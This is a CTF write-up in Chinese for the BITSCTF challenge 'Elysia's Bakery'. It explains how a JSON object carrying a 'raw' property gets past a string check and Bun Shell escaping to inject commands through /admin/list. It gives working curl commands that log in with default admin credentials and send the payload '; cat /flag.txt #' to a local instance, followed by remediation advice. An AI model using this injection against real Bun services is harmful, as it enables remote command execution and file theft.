---
title: 'BITSCTF Web Challenge: Elysia’s Bakery Write-up'

---

---

# BITSCTF Web Challenge: Elysia’s Bakery Write-up Web 


**從「看起來安全」的防護到成功繞過 Bun Shell 拿 Flag**

這道題目的精妙之處在於它展示了現代化後端運行環境（如 Bun）中，開發者對內建安全機制的過度依賴與誤解。表面上，系統針對常見的目錄穿越（Path Traversal）進行了防禦，但真正的致命傷卻隱藏在資料型別的邊界與 Shell 處理機制的盲區中。

## 1. 觀察與漏洞
透過初步分析題目提供的服務與原始碼（`src/index.ts`），我們可以梳理出以下關鍵資訊：

* **服務邏輯**：系統提供使用者註冊、登入以及筆記的 CRUD 功能。同時存在一個高權限的系統管理員帳號（預設帳號密碼為 `admin` / `admin_password`）。
* **關鍵路由**：管理員擁有一個專屬的 API 端點 `POST /admin/list`，用於列出特定資料夾的內容。
* **核心原始碼分析**：
`/admin/list` 的核心邏輯如下：
![image](https://hackmd.io/_uploads/r1X-t98O-e.png)



**初步診斷**：
- 只有 admin 才能呼叫 /admin/list（src/index.ts:199-202）
- 接收 body.folder（src/index.ts:203）
- 僅檢查字串是否包含 ..（src/index.ts:205-207）
- 直接丟進 Bun shell：$ls ${folder}``（src/index.ts:209）

程式碼明確使用了黑名單過濾 `..` 來防止使用者讀取非預期目錄。然而，真正的風險點在於**直接將使用者的外部輸入 (`folder`) 拼接進入 Shell 環境中執行**。

## 2. 原理機制分析 (Vulnerability Analysis)

### 為什麼常見 Payload 會失效？

當看到 `$`ls ${folder}` 時，許多攻擊者的直覺是進行 Command Injection（指令注入）。常見的 Payload 如：

* `; cat /flag.txt #`
* `$(cat /flag.txt)`

但如果直接傳入這些字串，伺服器通常只會回傳 `No such file or directory`。

**根本原因：Bun Shell 的 Escaping 機制**
現代的執行環境（如 Bun 的內建 Shell `$`) 為了防止指令注入，預設會對模板字面值（Template Literals）中的插值變數進行嚴格的跳脫（Escaping）。這意味著當我們傳入上述字串時，Bun 並不會把它們當作 Shell 語法解析，而是將整個字串視為 `ls` 指令的「單一字串參數」。

### Bun 的核心定位：All-in-one 工具鏈
在傳統的 Node.js 生態系中，如果你要開發一個專案，通常需要拼湊很多工具：
* 執行環境：Node.js
* 套件管理：npm、yarn 或 pnpm
* TypeScript 編譯：tsc、ts-node 或 esbuild
* 測試框架：Jest 或 Vitest
* 讀取環境變數：dotenv

Bun 的野心是「我全都要」。它把上述所有功能全部用底層語言重寫並打包在一起。你只需要安裝一個 bun，它同時就是執行器、套件管理器（安裝速度比 npm 快好幾倍）、打包工具和測試框架。而且它原生支援 TypeScript，你可以直接 bun run index.ts，連編譯設定都不用管。

Bun 實作了一個內建的跨平台 Shell。你只要用 $`` （Template Literal 加上一個錢字號），就可以直接在 JavaScript 裡面寫 Shell 腳本。

為了保護開發者，Bun Shell 預設會把你傳進去的變數（${folder}）進行嚴格的安全跳脫（Escaping）。也就是說，不管你傳什麼奇怪的字串進去，它都會把它當成「一個單純的字串參數」，而不是「一段可以執行的指令」，藉此防範傳統的 Command Injection。

### 真正的突破口：型別混淆與 `raw` 屬性

要打破這個僵局，我們必須回頭檢視 API 的邊界與資料流。
在上述的程式碼中：
`if (typeof folder === "string" && folder.includes(".."))`
這行程式碼雖然檢查了 `string`，**但並沒有強制規定 `folder` 只能是字串**。當我們傳入一個 JSON 物件時，它會完美繞過這個 `if` 檢查。

查閱 Bun Shell 的官方文件或底層行為可知，為了解決開發者需要動態拼接原始指令的需求，Bun 提供了一個 Escape Hatch（逃生艙）：**`raw` 物件**。
當傳遞給 Shell 的插值變數是一個包含 `raw` 屬性的物件時（例如 `{ raw: '...' }`），Bun 會放棄預設的跳脫機制，直接將該屬性值作為**原始 Shell 片段（Raw Shell Fragment）** 注入。

因此，如果我們將 Payload 構造成：

```json
{"folder": {"raw": "; cat /flag.txt #"}}

```

這段輸入不僅繞過了字串檢查，還成功欺騙 Bun 執行環境，將其視為合法的指令片段執行。

## 3. 攻擊流程與利用 (Exploitation)

以下為完整的攻擊步驟，藉由本機測試環境進行重現。

### 攻擊鏈圖解 (Attack Chain)

```text
[ Attacker ] 
    │
    ├─ 1. 登入 admin 取得 session cookie
    │
    ├─ 2. POST /admin/list 
    │     Body: {"folder": {"raw":"; cat /flag.txt #"}}
    ↓
[ Server API (/admin/list) ]
    │
    ├─ 3. 解析 JSON，folder 變數成為 Object
    ├─ 4. 繞過字串 ".." 檢查 (因 typeof folder !== "string")
    ↓
[ Bun Shell Executor ]
    │
    ├─ 5. 解析 $`ls ${folder}`
    ├─ 6. 識別到 {"raw": ...}，取消 Escaping 機制
    ├─ 7. 拼接成系統指令：ls ; cat /flag.txt #
    ↓
[ OS Kernel ]
    │
    ├─ 8. 執行 ls (無輸出或報錯)
    ├─ 9. 執行 cat /flag.txt
    ↓
[ Response ] 
    └─ 回傳包含 Flag 的執行結果給攻擊者

```
1) 攻擊者知道預設密碼  
2) 成功登入 admin  
3) 伺服器「正常地」發 session cookie  
4) 攻擊者拿這個 cookie 去打 admin API

**Step 1: 啟動本地環境**

```bash
docker build -t elysia-ctf .
docker run --rm -p 3000:3000 --name elysia elysia-ctf

```

**Step 2: 取得管理員憑證**
使用預設的 admin 帳號登入，並將 Session Cookie 保存下來，以便後續調用管理員權限的 API。
![image](https://hackmd.io/_uploads/ryW6258_Wx.png)
![image](https://hackmd.io/_uploads/ByXC258d-e.png)


```bash
curl -i -c cookie.txt -X POST http://127.0.0.1:3000/login \
  -H 'Content-Type: application/json' \
  --data '{"username":"admin","password":"admin_password"}'

```

**Step 3: 觸發注入，讀取 Flag**
攜帶 Cookie，向 `/admin/list` 發送惡意構造的 JSON Payload。這裡使用 `raw` 屬性進行 Shell 注入。
*(技巧：若想更穩定地觀察輸出，可將標準輸出導向標準錯誤輸出 `1>&2`，確保資料透過錯誤欄位回傳)*

```bash
curl -s -b cookie.txt -X POST http://127.0.0.1:3000/admin/list \
  -H 'Content-Type: application/json' \
  --data '{"folder":{"raw":"; cat /flag.txt #"}}'

```

成功執行後，伺服器回應中即會包含我們所需的 Flag。
![image](https://hackmd.io/_uploads/rJkDpcLObg.png)


## 4. 分析與修補建議 (Root Cause & Remediation)

這道題目完美示範了「瑞士起司理論」（Swiss Cheese Model），漏洞的產生不是因為單一失誤，而是多個防護層的漏洞恰好對齊：

1. **資料型別與 API 邊界驗證缺失**：沒有嚴格的 Schema 驗證，允許攻擊者傳入非預期的資料型別（Object 代替 String）。
2. **不安全的系統調用**：將外部不可信輸入直接帶入 Shell 環境中。
3. **錯誤處理不當**：將 Shell 執行的錯誤輸出（stderr/stdout）直接暴露給前端，造成資料外洩。

**防護與修補建議：**

* **移除 Shell 依賴（首要原則）**：永遠不要使用 `ls` 來讀取目錄。在 Node.js/Bun 環境中，應優先使用內建的 API，如 `fs.readdir()` 或 `fs.promises.readdir()`。
* **嚴格的 Schema 驗證**：在處理任何外部輸入前，必須確認資料型別與格式。確保 `folder` 必須是字串，並且符合白名單（例如：`^[a-zA-Z0-9/_-]+$`）。
* **錯誤訊息最小化**：後端發生錯誤時，應統一回傳一般性的錯誤訊息（如 `500 Internal Server Error`），避免將原始的系統錯誤日誌吐給客戶端。

![image](https://hackmd.io/_uploads/Byx1JsUOZe.png)
- /admin/list 主邏輯：src/index.ts:198
	- await readdir(target) 只是 Node API 讀目錄
	- 它不會解析 ;, $(...), | 這些 shell 語法
	- 攻擊者就算塞特殊字串，也只是「路徑字串」，不是命令
- 路徑限制：src/index.ts:206
	- 檢查 target 必須仍在 NOTES_DIR 底下：
	  - target === NOTES_DIR 或 target.startsWith(NOTES_DIR + sep)
	- 防目錄越界（例如 ../../.. 或變形路徑）
	- 防使用合法字元但導到不該看的位置
- 錯誤處理：src/index.ts:211
	- 統一回 500 Failed to list directory
	- 外部看不到內部細節，降低資訊外洩
- body schema：src/index.ts:219
	- folder 必須是 String
		- 擋掉 {"folder":{"raw":"; cat /flag.txt #"}}
	- regex：^[a-zA-Z0-9_./-]*$
		- 不給空白、;、$、|、反引號等可疑字符進來

## 5. 總結 (Conclusion)

解 Elysia’s Bakery 這題的核心是：**「不要只看 payload 輸出的結果，要回頭理解底層的 Runtime 行為」**。
當你發現傳統的 payload 不通時，往往不是因為沒有漏洞，而是還沒有觸碰到正確的語義層。在面對接受 JSON 格式的 API 時，攻擊面的寬度通常取決於框架如何處理複雜的資料結構（如 Array, Object），這也是現代 Web 安全中非常值得深挖的領域。

---

